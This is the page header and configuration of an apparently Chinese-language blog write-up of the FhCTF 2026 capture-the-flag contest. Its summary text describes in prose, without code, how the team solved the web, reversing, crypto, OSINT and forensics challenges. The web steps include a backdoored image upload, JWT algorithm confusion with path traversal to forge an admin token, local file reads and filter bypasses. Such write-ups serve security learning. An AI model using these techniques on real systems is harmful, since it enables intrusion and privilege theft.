<!DOCTYPE html><html lang="zh-TW" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>FhCTF 11401 | itouSouta</title><meta name="keywords" content="資安"><meta name="author" content="伊藤蒼太"><meta name="copyright" content="伊藤蒼太"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#18171d"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="FhCTF 11401"><meta name="application-name" content="FhCTF 11401"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#18171d"><meta property="og:type" content="article"><meta property="og:title" content="FhCTF 11401"><meta property="og:url" content="https://itousouta15.tw/2026/01/01/FhCTF/index.html"><meta property="og:site_name" content="itouSouta"><meta property="og:description" content="123452026 FhCTF &amp;#x2F; Team CTF01.01 – 01.05Group - --------------------------開放團訂麥當勞底下留言+1--------------------------Final — Rank 1（Top 1）   MiscSanity Che"><meta property="og:locale" content="zh-TW"><meta property="og:image" content="https://itousouta15.tw/img/FhCTF.png"><meta property="article:author" content="伊藤蒼太"><meta property="article:tag" content="伊藤蒼太, Blog, Coding, Learning, Life"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://itousouta15.tw/img/FhCTF.png"><meta name="description" content="123452026 FhCTF &amp;#x2F; Team CTF01.01 – 01.05Group - --------------------------開放團訂麥當勞底下留言+1--------------------------Final — Rank 1（Top 1）   MiscSanity Che"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://itousouta15.tw/2026/01/01/FhCTF/"><link rel="preconnect" href="//cdn.cbd.int"><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="google-site-verification" content="xxx"><meta name="baidu-site-verification" content="code-xxx"><meta name="msvalidate.01" content="xxx"><link rel="manifest" href="/manifest.json"><meta name="msapplication-TileColor" content="var(--anzhiyu-main)"><link rel="mask-icon" href="/img/siteicon/apple-icon-180.png" color="#5bbad5"><link rel="apple-touch-icon" sizes="180x180" href="/img/siteicon/apple-icon-180.png"><link rel="apple-touch-icon-precomposed" sizes="180x180" href="/img/siteicon/apple-icon-180.png"><link rel="icon" type="image/png" sizes="32x32" href="/img/siteicon/32.png"><link rel="icon" type="image/png" sizes="16x16" href="/img/siteicon/16.png"><link rel="bookmark" href="/img/siteicon/apple-icon-180.png"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2048-2732.jpg" media="(device-width: 1024px) and (device-height: 1366px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2732-2048.jpg" media="(device-width: 1024px) and (device-height: 1366px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1668-2388.jpg" media="(device-width: 834px) and (device-height: 1194px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2388-1668.jpg" media="(device-width: 834px) and (device-height: 1194px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1536-2048.jpg" media="(device-width: 768px) and (device-height: 1024px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2048-1536.jpg" media="(device-width: 768px) and (device-height: 1024px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1668-2224.jpg" media="(device-width: 834px) and (device-height: 1112px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2224-1668.jpg" media="(device-width: 834px) and (device-height: 1112px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1620-2160.jpg" media="(device-width: 810px) and (device-height: 1080px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2160-1620.jpg" media="(device-width: 810px) and (device-height: 1080px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1290-2796.jpg" media="(device-width: 430px) and (device-height: 932px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2796-1290.jpg" media="(device-width: 430px) and (device-height: 932px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1179-2556.jpg" media="(device-width: 393px) and (device-height: 852px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2556-1179.jpg" media="(device-width: 393px) and (device-height: 852px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1284-2778.jpg" media="(device-width: 428px) and (device-height: 926px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2778-1284.jpg" media="(device-width: 428px) and (device-height: 926px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1170-2532.jpg" media="(device-width: 390px) and (device-height: 844px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2532-1170.jpg" media="(device-width: 390px) and (device-height: 844px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1125-2436.jpg" media="(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2436-1125.jpg" media="(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1242-2688.jpg" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2688-1242.jpg" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-828-1792.jpg" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1792-828.jpg" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1242-2208.jpg" media="(device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2208-1242.jpg" media="(device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-750-1334.jpg" media="(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1334-750.jpg" media="(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-640-1136.jpg" media="(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1136-640.jpg" media="(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload='this.media="all"'><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"與無數有趣的靈魂相遇","addFriendPlaceholder":"暱稱（請勿包含部落格等字樣）：\n網站地址（需要提供部落格網址，請勿提交個人主頁）：\n頭像圖片網址（請提供盡可能清晰的圖片，我會上傳到我自己的圖床）：\n描述：\n網站截圖（可選）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)歡迎回乃！"},
  LA51: undefined,
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早安鴨👋，祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋，狀態很好，鼓勵一下～","startTime":10,"endTime":10},{"greeting":"現在是11點多啦，再堅持一下就吃飯囉～","startTime":11,"endTime":11},{"greeting":"午安👋 OwO","startTime":12,"endTime":14},{"greeting":"🌈充實的一天辛苦了！","startTime":14,"endTime":18},{"greeting":"19點囉，獎勵自己一頓豐盛大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋，在屬於自己的時間好好放鬆😌～","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  music_page_default: "nav_music",
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: false,
  mainTone: {"mode":"api","api":"https://img2color-go.vercel.app/api?img=","cover_change":true},
  authorStatus: undefined,
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查詢的內容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"轉為繁體","rightMenuMsgToSimplifiedChinese":"轉為簡體"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '複製成功',
    error: '複製錯誤',
    noSupport: '瀏覽器不支援'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '剛剛',
    min: '分鐘前',
    hour: '小時前',
    day: '天前',
    month: '個月前'
  },
  copyright: {"copy":true,"copyrightEbable":true,"limitCount":50,"languages":{"author":"作者: 伊藤蒼太","link":"連結: ","source":"來源: itouSouta","info":"著作權歸作者所有。商業轉載請聯絡作者獲得授權，非商業轉載請註明出處。","copySuccess":"複製成功，複製和轉載請標注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切換為繁體","cht_to_chs":"你已切換為簡體","day_to_night":"你已切換為深色模式","night_to_day":"你已切換為淺色模式","bgLight":"#506680","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={configTitle:"itouSouta",title:"FhCTF 11401",postAI:"",pageFillDescription:"Misc, Sanity Check, Christmas Tree, 駭客的密碼食譜, 笑話大師, 分享圖庫, 分享圖庫 Revenge, Python Compile, Survey, Survey, Web, INTERNAL LOGIN, Web Robots, Doors Open, The Visual Blind Spot, SYSTEM ROOT SHELL, Welcome to Cybersecurity Jungle, Templating Danger, Documents, LOG ACCESS, Pathway-leak, KID, Something You Put Into, Reverse, 簡易腳本閱讀器, OBF, The Lock, 主函數 (main) 邏輯, 驗證函數 (check_password) 分析, 演算法還原與逆向, 最終結果, 壞掉的解碼器, Crypto, 安全的加密, Encode By Py 😘, DES Lv.1 - 老船長的寶藏, DES Lv.2 – 再探老船長的寶藏（Write-up）, 管理員的密碼洋蔥, OSINT, Art Work, Trace the Landmark, 島1, The FH Gift, 工商時間 1, 工商時間 2, Lithium exploration, SRL, 島2, 漂亮的圓頂 1, 漂亮的圓頂 2, 沒戴安全帽的騎士, EXIF的「拍攝座標」, Blue team, 大訂單, 🧩 User’s Bad Day開放團訂麥當勞底下留言並看如何發放獎勵感謝本次活動的支援與贊助經典的霍夫曼編碼題我要吐槽一點霍夫曼編碼的英文是不是駭客的密碼食譜將每個食材的數值轉換成字元笑話大師恭喜這題被評為最鳥的一題我就只是輸入一個分享圖庫一進來我們可以看到這個介面只允許上傳發現有固定的字節標頭那我們就可以在標頭之後添加代碼構建嘗試多種指令讀取方式分享圖庫目標第行顯示儲存在環境變數中因此我們的目標是執行程式碼來讀取環境變數例如使用或漏洞入口負責處理上傳檢查機制它會檢查檔案是否為並嘗試用載入這防止了單純的改副檔名或文件尾附加代碼清洗機制最關鍵的是第行這會重繪圖片並存檔一般的例如在圖片結尾加經過這個步驟後附加的代碼會被丟棄只剩下純圖片數據檔名漏洞第行伺服器直接使用了你上傳的檔名與副檔名如果你上傳它就會存成解題思路我們需要利用技術我們需要構造一個特殊的圖片使得它在被讀取並由重新壓縮寫入後新的圖片數據流中仍然包含代碼這通常是透過操控的塊像素數據來達成當這些像素被壓縮算法處理時會剛好組成類似的字串攻擊步驟第一步生成你需要一個腳本來生成這種抗清洗的以下是一個常用的生成腳本基於國外研究員的技術請將以下程式碼存為並在你的電腦上用執行它產生一個可以繞過重繪的執行後會得到這個圖片的特性是即使經過再裡面的數據仍會包含後門第二步準備攻擊檔案將生成的重新命名為伺服器檢查內容它是合法的通過伺服器存檔存為因為我們檔名是伺服器清洗的構造特性讓它在清洗後代碼依然存在第三步上傳與執行回到題目網頁上傳因為我們的是我們可以用參數傳入指令在程式碼錯誤時會顯示代表在處理錯誤時還是會讀到檔案可以推測可能為題在程式碼輸入框隨意輸入會造成語法錯誤的程式碼並送出頁面會顯示且錯誤訊息包含與該行內容的回顯由錯誤可推測後端在渲染時會依行數讀取來源檔案的對應行內容且讀檔目標來自使用者的這形成本地檔案讀取風險以驗證將中的改為如同時維持語法錯誤的程式碼觀察錯誤訊息是否顯示該檔案內容為了讓出現在第行將程式碼內容設為單一會再嘗試讀取的第行並顯示在中在中可以看到的輸出可以得到包含的最後就可以拿到客戶端注入模擬在欄位輸入對就是可以看到有那我們就直接進看吧進後會跳轉到那很明顯我們看的出來上一步就是目錄一樣先看那就進看看吧這裡點開直接是那我們就開始用跑發現都不是看著越來越多人解就想說應該沒那麼難吧所以就想說會不會是負數計算正確的密鑰十六進位十進位正確的值解密數據包含加密的數據解密公式在標籤中發現碼數組轉換為字元最後加上觸發方式一進來會看到上面的畫面看時注意到標籤包含一段日文言語変本質変意旨即使改變語言編程的本質也不會改變題目的關鍵在於設置正確的名稱編碼解碼後值編碼解碼後日文的接下來進到改值後重新整理即可題繞過方法當輸入包含時系統會執行解碼然後在過濾後直接用的渲染內容這允許我們使用編碼繞過括號過濾一進來看照慣例看找出隱藏字元告訴了你一切檢查標頭發現通常有端點可以發現端點需要標頭所以我們需要偽造他這題提供了一個安全的日誌讀取工具聲稱能偵測並阻擋所有攻擊題目明確提示這個工具完全沒有後端所有判斷似乎都在瀏覽器中完成驗證條件非常清楚輸入必須包含超過個點字元輸入必須包含字串不區分大小寫混淆字串解碼中使用了幾個混淆的變數解碼解碼位元運算轉解碼組合起來打開題目網站觀察檔案管理介面與網頁原始碼在區塊中發現檔案載入是呼叫題目另外提供的檔案清單顯示伺服器上還存在推論後端很可能沒有檢查目前使用者是否真的屬於該因此直接嘗試跨請求伺服器回應內容為進入題目網頁後先打開瀏覽器的檢查元素開發者工具在原始碼與區可以看到幾段訊息直接洩漏了後端的驗證邏輯金鑰路徑這代表伺服器會根據裡的去檔案系統讀取金鑰例如對應危險的相容模式這表示伺服端在驗證時同時支援非對稱與對稱模式而且實作方式存在演算法混淆風險目前權限頁面顯示登入身份為顯然目標是偽造取得權限接著從中取出例如丟到觀察內容可以得到類似結構這些資訊已經足夠判斷伺服器會依去讀檔案並用其中內容當作金鑰來驗證漏洞原理分析這題結合了兩個常見錯誤目錄遍歷後端實作概念大致類似若沒有過濾攻擊者可以傳入像是讓伺服器實際去開啟的路徑變成而不是預期的雖然我們看不到檔案內容但伺服器會自己幫我們載入並當成金鑰使用這就是利用點演算法混淆預期設計應該是使用使用非對稱金鑰簽發驗證應該被視為公鑰只能用來驗證但現在伺服器支援實作類似用驗證仍然讀同一個檔案但把整個內容當成結果變成當時伺服器會把原本是公鑰的檔內容當成對稱金鑰來驗證只要攻擊者知道這個就能在外面自己簽問題是的內容我們不知道所以沒辦法直接利用但目錄遍歷讓我們可以選擇其他檔案來當攻擊思路設計關鍵想法找一個內容已知的系統檔案讓伺服器把它讀進來當對來說的內容就是空的所以可以預期程式讀取讀到空字串只要我們在本地端用空字串當就能產出與伺服器一致的簽章再把裡的改成就可以偽造一個被伺服器接受的管理員因此攻擊步驟是把的改為改為用空字串簽產生新的將中改成甚至改成達成提權實作偽造以下使用生成偽造惡意目錄遍歷指向改用惡意直接把角色改成簽名密鑰為空字串對應伺服器讀取的結果偽造的步驟從原本拿到合法確認欄位名稱例如等執行腳本得到一個新的字串在瀏覽器中找到原本存的例如將其值整個替換為重新整理頁面若後端如題目描述那樣實作伺服器會看到用模式驗證看到讀取當作空字串用空字串驗證因為我們本地端也是用空字串簽的所以驗證會通過裡因此認定我們是管理員檢視可知是由系統設定取出確認會從中讀取檢查設定檔可發現以形式存在環境變數設定中簡易腳本閱讀器先看從第行開始跳過了用戶輸入可以修改列表中的任何位置指令可以改變指令指針到任何索引那其實我們直接輸入就好了先看使用了大量的混淆技術變數單字母命名等簡化的內置函數狀態機設計使用字典和指針魔法數字和字符串實現了一個狀態機按以下順序執行狀態解碼資料結果狀態字符串反向資料反向狀態解碼資料解碼狀態字符減資料結果狀態驗證完成檢查密鑰長度完整密鑰字符這個密鑰是通過部分組合而成字符字符字符解碼字符字符串反向字符解密過程給定的加密輸出使用密鑰進行解密使用靜態分析主函數邏輯透過反編譯後可以看到函數的流程如下格式檢查檢查輸入是否以開頭並以結尾核心驗證這是最關鍵的函數若回傳值為真則代表正確驗證函數分析進入函數後可以觀察到以下關鍵點字串處理程式使用提取了花括號內的內容長度限制內容長度必須正好為個字元關鍵數據金鑰陣列目標數值陣列演算法公式演算法還原與逆向為了得到原始輸入我們需要將上述公式進行移項反推先處理加法偏移再處理異或運算自動化解密腳本為了快速得到結果我們編寫以下腳本逆向公式最終結果經過腳本執行花括號內的字串為內容分析該字串是形式的最終答案壞掉的解碼器給了兩個檔案其中裡有裡有廞廞廞廞諲胗姲慝驧粀殪橏樲斢憸廨嶵嬙檌癚亍灀黂鍔霞韆毤趒鋄轣鴦艷鏤駍釓禧壁鏤貸輾貸輾礑鏤輤輤霂齴轣輤陊轣輤妲轣輤卍隨蹥噮蹧駉蹥瞰瞰閫韏嬐瞰媻駗瞰銶媻鋃瞰膣膣膣瞰蹧鞊餈嶧膣渾渮軷媻遯唅軾濎媻軾渮軾媻缿渮鋓欲欲荻欲駏欲渾純錘錘鎂壺荻渾欲韐軾軾輘鷣遰卍輤詡轣轣詡輤鄫駓潘梃堆剁渤碠蘥提供二進位檔與加密檔案需逆向分析解密邏輯並實作腳本取得透過與函數符號識別關鍵演算法包括等靜態分析執行顯示程式讀取檔案使用並依賴與符號如符號表揭示核心函數從生成初始使用的方式模偽隨機產生器公式右旋位移讀取字串對每執行旋轉更新原片段顯示資料與提示邏輯還原解密流程為每獨立處理解析為即注意加原始非旋轉後此與常見流密碼不同更新依賴原始密文形成依賴鏈解密腳本安全的加密這題展示了為什麼加密模式不適合用於圖像資料加密機制分析題目使用腳本將轉換為圖檔後再透過加密特別的是加密金鑰直接從的十六進位表示取得由於的指令在金鑰長度不足時會自動填充零位元組至實際加密過程中的金鑰是可預測的攻擊向量最致命的弱點在於相同明文區塊總是產生相同密文區塊當加密對象是結構化資料如圖像時這個特性會直接暴露資料的空間分布模式解密步驟由於圖檔格式為像素的每個像素佔總共以為單位分塊加密對應到圖像中就是每個像素為一組透過以下步驟重建圖像讀取加密檔案並按切分成區塊跳過標頭佔用的前約個區塊將每個加密區塊視為一個顏色單元重新排列成的區塊陣列為不同的密文區塊指派不同顏色進行視覺化由於文字區域和背景區域的像素值不同加密後會產生截然不同的密文區塊透過顏色映射文字的輪廓會清晰呈現直接讀取即可得到設定根據經驗或測試調整範圍讀取加密檔案切分區塊找出背景頻率最高的區塊轉換為背景文字暴力枚舉寬度並繪圖如果不是背景就畫黑點我們可以看到是反過來的這題的核心是自製加密其實只是一個可逆的位移編碼加上可預測的循環與大量重複樣本整體安全性非常脆弱整體流程概覽程式啟動時會載入一組金鑰字串預設值是然後讀取的內容作為明文主邏輯在逐處理輸入將每個轉成對應的最後寫出到編碼時使用固定和範圍所以結果都落在一小段區間單一的編碼對每個明文字節先計算當前索引對應到的位置用做位移再搭配產生一個偏移量真正輸出的值是如果落在特定保留區間則再減去做修正確保最後是合法某些特殊例如換行不會轉成而是原樣輸出並且用來驅動長度相關的計數變數影響後面的計算索引循環與行為分析的使用位置不是單純而是其中只在碰到特定實際上就是那個某值就原樣輸出的條件時才會更新這代表整個加密過程是被分段的每次遇到那個特殊控制字元例如換行就會重設或改變循環長度導致每一行的不同檔案裡第一大段重複的等其實就是利用同一個明文字節反覆出現讓對應的位置重複成為攻擊者觀察的絕佳樣本解密邏輯的逆向設計要還原明文第一步是把每個轉回如果是被挪到替代區段的就加回再減掉得到原本的模之前的加密值接著用同樣的和位移規則把反推回因為運算中有所以理論上只能恢復的明文模值但對這題來說被映射到一個有限字元集合中這樣的資訊已經足夠辨識實作上就是還原出每個位置對應的用加密公式反向求解原始在的值把這些值映射到一組可視字元表例如固定順序的字元上得到可讀內容利用重複行恢復金鑰題目給的第一行是一長串完全規律重複的本質上對應同一個明文字元例如空白或某個固定符號相當於已知明文大量重複對每個重複位置已知相同明文字節對應的即與為常數於是可以直接把方程式中的反推回來逐個位置解出的每個最後得到長度為的並且確認這組鍵值會在整段密文中週期性重複有了完整即可對每個進行上述的逆運算把整個轉回明文序列還原與解碼後得到的並不是直接的一行而是一個由可視字元構成的大型風格與輸出的字型一致把還原出的字元陣列依照原始換行配置輸出就能看到一個大字樣裡面嵌著形如的內容將這段轉成圖片或直接在等寬字型終端機中觀看肉眼就可以辨認出真正的整個過程只利用演算法可逆性高度重複的已知明文行有限字元集合導致的模空間縮小這也說明了位元運算並不會自動帶來任何額外安全性只是另一種換皮的古典密碼而已常數定義建立數值到字元的映射表讀取並解析加密的文件建立索引序列用於解密解密序列將解密後的數值轉換為藝術字元將藝術渲染成圖片嘗試載入字體計算圖片尺寸建立圖片並繪製文字儲存圖片主程式流程步驟解析加密檔案正在解析加密檔案步驟建立索引序列正在建立索引序列步驟解密正在解密步驟轉換為藝術正在轉換為藝術步驟渲染成圖片正在渲染圖片完成圖片已儲存至藝術預覽老船長的寶藏高度修復題目分析目標檔案現象圖片底部被截斷無法看到完整內容原因檔案的高度數值在中被惡意修改導致瀏覽器只渲染上半部分底部的關鍵資訊被隱藏核心原理檔案格式使用區塊儲存圖片尺寸資訊標記或結構長度精度高度寬度位元組序大端序當高度被人為改小時圖片檢視器會忽略超出高度的像素資料但這些資料仍完整保留在檔案中只要將高度值恢復或調大隱藏的內容就會顯示出來腳本讀取與搜尋標記搜尋所有標記或此步驟找出所有定義圖片尺寸的位置由於可能包含縮圖因此可能存在多個區塊鎖定主圖片跳過標記本身和長度欄位和精度高度位置寬度位置找出寬度最大的區塊表示符合規範主圖片通常具有最大的寬度尺寸修改高度並儲存設定為足夠大的高度成功修復後開啟圖片即可看到底部隱藏的資訊包括檔案提示部分提示密鑰爆破題目背景加密演算法輸入檔案編碼的密文已知資訊題目提示可以幫你加速解密地圖右下角紅字部分加密模式判斷檢查特徵字串長度為偶數可轉換為轉換後長度是的倍數符合由於題目未提供且這是入門級題目推測使用模式特性不需要每個獨立加密解密相同明文產生相同密文密鑰結構分析密鑰固定為已知前未知後需要爆破字元集英文大小寫數字個字元組合數種可能加速策略題目提示意味著不需要解密整個檔案只解密第一個即可驗證密鑰正確性利用已知明文攻擊的概念解題腳本爆破版本讀取密文只取第一個使用找到的密鑰解密完整檔案移除執行結果直接解密版本若已知完整密鑰可直接解密移除結果成功解密後的內容再探老船長的寶藏題目描述與線索整理題目提示有一份加密資料上一題曾出現圖上還有並明確提示可以幫你加速解密目標解出密文內容找到座標或初步分析密文格式與特徵拿到後先做格式判斷檔案內容看起來像一長串字元因此需先才能得到真正密文因此密文長度應該是的倍數用於驗證資料合理性程式中對應處理攻擊策略猜爆破結構題常見陷阱不是只在而是可能是需要可能是固定值全由提示字串例如提供直接放在密文前有可能不是你以為的也可能是因此本解法採用同時測多種加密情境在裡一次測四種最常見組合常見格式不需要同時測多種結構由於圖上有上一題完整有因此假設可能由固定碼可爆碼組成測試兩個可自行擴充並對每個測兩種拼法爆破範圍使用常見可見字元集合加上一些常見符號目的涵蓋常用風格同時避免一次把全塞爆造成時間失控爆破約為長度碼快速判斷是否解對避免每把解全文爆破最慢的地方不是試而是每把都解完整密文因此此解法採用快速過濾只解前當做判斷判斷是否像答案用兩種條件命中可見字元比例高抓常見小數座標格式可見字元比例當命中或才會解全文找的方式若題目直接把放在明文中程式也會用搜尋執行方式安裝套件執行等待等待成功輸出判讀大概很久當找到候選程式會印出命中的與前若有印出以及前輸出如下管理員的密碼洋蔥個給上網工具查解得到個但經過通靈我們可以猜到這個答案把轉成文字就行得到最後就可以拿到給了一張圖片以圖搜圖我們會發現一個叫做風之籽的作品被展出於的屏東落山風藝術季屏東縣落山風藝術季給了三張圖片用第三張來圖片搜尋找到了這個建築按照題目排好後得到島給了這張圖即使被打碼還是可以大致看出是新廟口餐廳搜尋後找到餐廳後我就對著菜單和圖中的菜一一窮舉最後答案是原圖正中間的那道炒千佛手新大廟口活海鮮炒千佛手一開始會出現點開來會發現這個文件實際上不是文件而是一個偽裝的壓縮檔通過檢查文件的魔術數字前幾個可以看到它以開頭這是檔案的特徵標記工商時間他給了以下圖片把他丟到可以得到以下資料然後他的是一個網站點進去他會跳出來一個帶你到展覽網站的按就會跳過去可以看到我們可以知道是臺北市數位實驗高級中等學校學習分享會轉成格式是工商時間由工商時間我們可以從活動官網得知活動地點在臺北市中山區吉林路號我們把地址丟到收尋並複製座標貼上來丟給國家玻利維亞湖泊名稱鹽沼烏尤尼鹽沼生產礦物鋰原本是錯的但後來改題目後就對了很奇妙給了以下圖片我們可以看到右方是大巨蛋後景有國父紀念館和台北所以我們可以推斷我們在島在清末民初年代人們對麻瘋病痲瘋病所知有限為了阻絕得病的患者就把他們送到建功嶼上自生自滅因此這座島被稱為痲瘋礁患者被隔離在島上後只能遙望金門本島無法回家搜尋漂亮的圓頂請通靈漂亮的圓頂簡單搜尋免費船班土耳其可以讓我們找到土耳其航空的這個頁面看可以發現我們的目的地就正處於博斯普鲁斯海峽附近我們可以驗證這是對的方向我們有了這些資訊博斯普魯斯海峽之旅月日至月日期間營運通靈一下格式變成沒戴安全帽的騎士上網簡單圖片查資料可知廠牌車型每個試一下就能鎖定下答案的拍攝座標這題給的檔案出了點小問題但就是完組合一下照片的經緯度通靈一下就好了大訂單一組加密的十六進制字串網路封包的顯示請求檢查提供的封包內容可以觀察到以下關鍵資訊從封包中的欄位可以推測很可能就是用於加密的金鑰使用對十六進制字串進行解密將解密得到的提交到進行查詢在的分析報告中可以找到該惡意軟體的通訊目標伺服器給出的線索是一段封包紀錄要求從中找出三個關鍵資訊主機名稱帳號名稱與檔案名稱最後依指定格式組成查詢中的主機名稱在封包最前面可以看到一個封包內容類似這代表使用者原本想連線的主機是題目提示主機名稱不含因此只取前半段主機名稱不含主機名稱失敗與啟用當查詢失敗時會嘗試使用來解析同一個名稱封包中可看到類似這表示系統改用發送名稱查詢詢問誰是怪事的來源在這個階段攻擊者主機例如偽裝成回應這個查詢聲稱自己就是目標伺服器結果使用者誤以為解析成功實際上連到的是攻擊者主機之後便會對攻擊者的建立連線並送出驗證資訊這就是典型的攻擊流程也是題目名稱的由來帳號名稱從驗證中取得使用者帳號當使用者透過連向假冒的伺服器時會進行驗證流程其中會包含封包在這類封包中通常可解析出將封包中的字串解碼後可以得到題目問的是攻擊者攔截到的帳號名稱也就是驗證裡的使用者名稱帳號名稱檔案名稱從封包中的字串還原在後續封包中會出現使用者嘗試存取的檔案路徑或檔案名稱題目提示要注意編碼因此用十六進制觀看封包內容時可以看到類似將這串以解碼合起來就是題目同時強調檔案名稱不含副檔名所以即便實際檔案可能是等在中只需要檔名本體檔案名稱依題目指定格式主機名稱帳號代號檔案名稱將前面三個已確認的答案依序代入主機名稱帳號代號帳號名稱檔案名稱得到最終",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2026-02-22 12:29:07",postMainColor:""}</script><noscript><style type="text/css">#nav{opacity:1}.justified-gallery 